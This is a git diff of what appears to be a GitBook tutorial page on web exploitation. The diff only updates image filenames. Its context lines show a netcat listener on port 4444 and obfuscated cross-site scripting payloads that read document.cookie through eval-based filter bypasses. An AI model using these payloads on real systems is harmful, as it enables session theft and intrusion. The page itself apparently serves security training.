@@ -297,7 +297,7 @@ in website&#x20;
 nc -nvlp 4444
 ```
 
-<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (14) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## How to Bypass Protection
 
@@ -651,7 +651,7 @@ Exploit using Arithmetic Operators
 http://192.168.1.3/web/vulnapp.php%20/?user=%27)|eval(%27onload=a%27.concat(%27lert(document.cookie)%27))//#!
 ```
 
-<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (2).png" alt=""><figcaption></figcaption></figure>
 
 ```javascript
  /?user='),alert?.('document.cookie//
